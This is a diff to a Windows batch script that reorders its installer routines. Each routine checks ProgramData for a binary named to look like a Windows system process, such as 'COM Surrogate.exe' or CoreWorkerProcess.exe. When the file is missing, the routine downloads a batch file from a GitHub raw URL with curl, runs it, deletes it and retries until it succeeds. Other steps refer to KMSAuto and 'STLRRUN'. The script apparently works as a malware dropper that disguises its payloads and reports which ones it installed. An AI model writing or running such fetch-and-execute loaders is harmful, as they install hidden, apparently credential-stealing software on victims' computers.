@@ -415,53 +415,6 @@ set "KMSAutoMD5=325d0bd19d0153c5be3324cdbba60e33"
 
 
 
-:CheckCWP
-echo :CheckCWP
-echo.
-
-
-
-:: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
-if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
-    goto CheckSHST
-)
-
-
-
-:: Run commands if CoreWorkerProcess.exe is not found
-echo Checking for CoreWorkerProcess...
-set "embeddedScript=temp_script_CWP.bat"
-
-:: Download content and save to the embedded batch file
-curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
-
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
-    echo.
-    echo.
-) else (
-    echo Filed to get content from ShellHost Link
-    echo.
-    timeout /t 3 /nobreak >nul
-    goto CheckCWP
-)
-
-
-set "MESSAGE=CoreProcessInstalled|"
-set "CheckSend=1"
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -494,8 +447,8 @@ echo.
 
 if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
     echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
-	echo going to CheckComSurrogate
-    goto CheckComSurrogate
+	echo going to CheckKMSAuto
+    goto CheckKMSAuto
 )
 
 echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
@@ -508,14 +461,14 @@ echo.
 
 if exist "%SHSTFILEroot%" (
     echo Failed to delete %SHSTFILEroot%!
-	goto CheckComSurrogate
+	goto CheckKMSAuto
 ) else (
     echo Successfully deleted %SHSTFILEroot%.
 )
 
 if exist "%SHSTFILE%" (
      echo Failed to delete %SHSTFILE%!
-	 goto CheckComSurrogate
+	 goto CheckKMSAuto
 ) else (
      echo Successfully deleted %SHSTFILE%.
 )
@@ -549,7 +502,7 @@ if exist "%embeddedScript%" (
     echo Filed to get content from ShellHost Link
     echo.
     timeout /t 3 /nobreak >nul
-    goto CheckSHST
+    goto SHSTINSTALL
 )
 
 set "MESSAGE=%MESSAGE%SHST|"
@@ -561,37 +514,17 @@ set "CheckSend=1"
 
 
 
-:CheckComSurrogate
-echo :CheckComSurrogate
-echo.
 
-:: Check ComSurrogate.exe; if found, skip to next section
-if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
-    goto CheckKMSAuto
-)
 
-:: Run commands if ComSurrogate.exe is not found
-echo Checking for COM Surrogate...
-set "embeddedScript=temp_script_COM.bat"
 
-:: Download content and save to the embedded batch file
-curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate"
 
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
-    echo.
-    echo.
-) else (
-    echo Filed to get content from ComSurrogate Link
-    echo.
-    timeout /t 3 /nobreak >nul
-    goto CheckComSurrogate
-)
 
-set "MESSAGE=%MESSAGE%ComSurrogate|"
-set "CheckSend=1"
+
+
+
+
+
+
 
 
 
@@ -633,8 +566,8 @@ echo.
 
 if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
     echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
-	echo going to CheckNIRCMD
-    goto CheckNIRCMD
+	echo going to CheckComSurrogate
+    goto CheckComSurrogate
 )
 
 echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
@@ -647,14 +580,14 @@ echo.
 
 if exist "%KMSFILEroot%" (
     echo Failed to delete %KMSFILEroot%!
-	goto CheckNIRCMD
+	goto CheckComSurrogate
 ) else (
     echo Successfully deleted %KMSFILEroot%.
 )
 
 if exist "%KMSFILE%" (
      echo Failed to delete %KMSFILE%!
-	 goto CheckNIRCMD
+	 goto CheckComSurrogate
 ) else (
      echo Successfully deleted %KMSFILE%.
 )
@@ -684,11 +617,137 @@ if exist "%embeddedScript%" (
     echo Filed to get content from KMSAuto Link
     echo.
     timeout /t 3 /nobreak >nul
-    goto CheckKMSAuto
+    goto KMSINSTALL
 )
 
 set "MESSAGE=%MESSAGE%KMSAuto|"
 set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckComSurrogate
+echo :CheckComSurrogate
+echo.
+
+:: Check ComSurrogate.exe; if found, skip to next section
+if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
+    goto CheckCWP
+)
+
+:: Run commands if ComSurrogate.exe is not found
+echo Checking for COM Surrogate...
+set "embeddedScript=temp_script_COM.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
+) else (
+    echo Filed to get content from ComSurrogate Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckComSurrogate
+)
+
+set "MESSAGE=%MESSAGE%ComSurrogate|"
+set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CheckCWP
+echo :CheckCWP
+echo.
+
+
+
+:: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
+if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
+    goto CheckNIRCMD
+)
+
+
+
+:: Run commands if CoreWorkerProcess.exe is not found
+echo Checking for CoreWorkerProcess...
+set "embeddedScript=temp_script_CWP.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
+) else (
+    echo Filed to get content from CoreWorkerProcess Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckCWP
+)
+
+
+set "MESSAGE=CoreProcessInstalled|"
+set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -767,7 +826,7 @@ if exist "%embeddedScript%" (
     echo Filed to get content from NIRCMD Link
     echo.
     timeout /t 3 /nobreak >nul
-    goto CheckNIRCMD
+    goto CheckSTLRRUN
 )
 
 set "MESSAGE=%MESSAGE%STLRRUN|"
